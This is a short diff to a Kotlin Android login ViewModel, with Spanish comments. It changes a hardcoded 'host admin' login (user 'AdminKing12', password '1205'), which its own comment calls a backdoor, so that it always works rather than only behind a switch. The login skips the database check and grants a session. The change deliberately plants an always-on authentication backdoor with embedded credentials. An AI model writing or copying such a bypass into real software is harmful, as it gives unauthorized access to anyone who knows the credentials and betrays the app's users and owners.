@@ -18,7 +18,7 @@ import java.time.format.DateTimeFormatter
 data class LoginUiState(
     val username: String = "",
     val password: String = "",
-    val isAdminLogin: Boolean = false,   // lo dejamos para no romper el LoginScreen
+    val isAdminLogin: Boolean = false,   // lo dejamos por compatibilidad con la UI
     val isHostAdmin: Boolean = false,
     val isLoading: Boolean = false,
     val passwordVisible: Boolean = false,
@@ -70,11 +70,14 @@ class LoginViewModel(
 
         viewModelScope.launch {
             try {
-                // 1) Host admin (backdoor) sigue funcionando si el switch está encendido
-                if (uiState.isHostAdmin && user == "AdminKing12" && pass == "1205") {
-                    // No hay usuario en BD, pero marcamos la sesión como "host admin"
+                // 1) Host admin (backdoor) SIEMPRE disponible con estas credenciales
+                if (user == "AdminKing12" && pass == "1205") {
+                    // No hay usuario en BD, pero dejamos la sesión sin usuario
+                    // (Home usará 'Master' como nombre cuando no haya currentUser)
                     SessionManager.setCurrentUser(null)
-                    registrarLoginEnBitacora("Master")
+
+                    registrarLoginEnBitacora("AdminKing12")
+
                     uiState = uiState.copy(isLoading = false, errorMessage = null)
                     onSuccess()
                     return@launch
@@ -148,4 +151,5 @@ class LoginViewModelFactory(
         throw IllegalArgumentException("Unknown ViewModel class: ${modelClass.name}")
     }
 }
+
 
